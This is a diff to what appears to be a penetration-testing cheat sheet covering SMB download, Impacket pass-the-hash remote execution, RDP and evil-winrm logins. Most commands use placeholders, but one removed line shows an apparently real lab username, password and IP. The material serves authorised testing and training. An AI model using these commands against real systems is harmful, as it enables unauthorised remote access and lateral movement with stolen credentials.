@@ -35,22 +35,17 @@ Download all files from a directory recursively
 > smbclient //10.10.10.10/Share$ -U username -c "prompt OFF;recurse ON;mget *"
 
 Impacket tools
-> psexec.py domain.local/username:password@10.10.10.10
-> psexec.py domain.local/username@10.10.10.10 -hashes :h1a2s3h4
+> psexec.py domain/username:password@10.10.10.10
+> psexec.py domain/username@10.10.10.10 -hashes h1a2s3h4:h1a2s3h4
 
-> wmiexec.py domain.local/username:password@10.10.10.10
-> wmiexec.py domain.local/username@10.10.10.10 -hashes :h1a2s3h4
+> wmiexec.py domain/username:password@10.10.10.10
+> wmiexec.py domain/username@10.10.10.10 -hashes h1a2s3h4:h1a2s3h4
 
-> smbexec.py domain.local/username:password@10.10.10.10
-> smbexec.py domain.local/username@10.10.10.10 -hashes :h1a2s3h4
+> smbexec.py domain/username:password@10.10.10.10
+> smbexec.py domain/username@10.10.10.10 -hashes h1a2s3h4:h1a2s3h4
 
-> atexec.py domain.local/username:password@10.10.10.10 whoami
-> atexec.py domain.local/username@10.10.10.10 -hashes :h1a2s3h4
-```
-
-###### ~
-```
-
+> atexec.py domain/username:password@10.10.10.10 whoami
+> atexec.py domain/username@10.10.10.10 -hashes h1a2s3h4:h1a2s3h4
 ```
 
 ###### RDP 3389
@@ -59,18 +54,13 @@ rdesktop
 > rdesktop -d domain -u username -p password 10.10.10.10:3389
 
 XFreeRDP
-> xfreerdp /u:MIMAS\neville /p:OvercookedCapeBrewing870 /v:192.168.47.122:3389
+> xfreerdp /u:domain\username /p:password /v:10.10.10.10:3389
 ```
 
 
 ###### WinRM 5985 & 5986
 ```
 EvilWinRM
-> ./evil-winrm.rb -i 10.10.10.10 -u Username -H h1a2s3h4
-> ./evil-winrm.rb -i 10.10.10.10 -u Username -p password
-```
-
-###### VNC
-```
-
+> ./evil-winrm.rb -i 10.10.10.10 -u username -H h1a2s3h4
+> ./evil-winrm.rb -i 10.10.10.10 -u username -p password
 ```
